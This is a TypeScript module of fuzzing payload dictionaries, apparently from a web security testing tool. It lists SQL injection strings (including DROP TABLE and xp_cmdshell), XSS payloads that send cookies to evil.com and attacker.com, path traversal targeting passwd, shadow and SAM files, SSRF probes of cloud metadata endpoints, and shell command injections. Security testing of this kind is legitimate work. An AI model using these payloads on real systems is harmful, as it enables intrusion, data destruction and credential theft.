/**
 * Built-in payload dictionaries for fuzzing
 */

export const SQLI_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "1' ORDER BY 1--",
  "1' ORDER BY 100--",
  "1 UNION SELECT NULL--",
  "1 UNION SELECT NULL,NULL--",
  "' UNION SELECT username,password FROM users--",
  "1; DROP TABLE users--",
  "1'; EXEC xp_cmdshell('whoami')--",
  "admin'--",
  "' OR 1=1#",
  "' OR 'x'='x",
  "') OR ('1'='1",
  "' AND 1=0 UNION SELECT @@version--",
  "' HAVING 1=1--",
  "' GROUP BY columnnames having 1=1--",
  "1' WAITFOR DELAY '0:0:5'--",
  "1' AND SLEEP(5)--",
  "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  "'; WAITFOR DELAY '0:0:5'--",
  "%27%20OR%20%271%27%3D%271",
  "1%27%20AND%20SLEEP(5)--",
];

export const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '"><script>alert(1)</script>',
  "'-alert(1)-'",
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '{{constructor.constructor("alert(1)")()}}',
  '${alert(1)}',
  '<img src=x onerror="fetch(\'http://evil.com/\'+document.cookie)">',
  'javascript:alert(1)',
  '<details open ontoggle=alert(1)>',
  '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  '"><img src=x onerror=alert(1)>',
  '<script>fetch("http://attacker.com/?c="+document.cookie)</script>',
];

export const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '/etc/passwd',
  '/etc/shadow',
  '..%c0%af..%c0%af..%c0%afetc/passwd',
  '..%00/etc/passwd',
  '....\\....\\....\\etc\\passwd',
  '/proc/self/environ',
  '/proc/self/cmdline',
];

export const SSRF_PAYLOADS = [
  'http://127.0.0.1',
  'http://localhost',
  'http://0.0.0.0',
  'http://[::1]',
  'http://169.254.169.254/latest/meta-data/',
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://100.100.100.200/latest/meta-data/',
  'http://169.254.169.254/latest/api/token',
  'http://2130706433', // 127.0.0.1 as decimal
  'http://0x7f000001', // 127.0.0.1 as hex
  'http://017700000001', // 127.0.0.1 as octal
  'file:///etc/passwd',
  'gopher://127.0.0.1:25/',
  'dict://127.0.0.1:11211/',
];

export const NOSQL_PAYLOADS = [
  '{"$gt":""}',
  '{"$ne":""}',
  '{"$regex":".*"}',
  '{"$where":"sleep(5000)"}',
  "true, $where: '1 == 1'",
  '{$gt: ""}',
  '[$ne]=1',
  '{"$or":[{},{"a":"a"}]}',
];

export const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(whoami)',
  '; ping -c 3 127.0.0.1',
  '| id',
  '&& id',
  '|| id',
  '\n/bin/cat /etc/passwd',
  ';sleep 5',
];

export type WordlistName = 'sqli' | 'xss' | 'path-traversal' | 'ssrf' | 'nosql' | 'command-injection' | 'all';

export function getPayloads(name: WordlistName): string[] {
  switch (name) {
    case 'sqli':
      return SQLI_PAYLOADS;
    case 'xss':
      return XSS_PAYLOADS;
    case 'path-traversal':
      return PATH_TRAVERSAL_PAYLOADS;
    case 'ssrf':
      return SSRF_PAYLOADS;
    case 'nosql':
      return NOSQL_PAYLOADS;
    case 'command-injection':
      return COMMAND_INJECTION_PAYLOADS;
    case 'all':
      return [
        ...SQLI_PAYLOADS,
        ...XSS_PAYLOADS,
        ...PATH_TRAVERSAL_PAYLOADS,
        ...SSRF_PAYLOADS,
        ...NOSQL_PAYLOADS,
        ...COMMAND_INJECTION_PAYLOADS,
      ];
  }
}
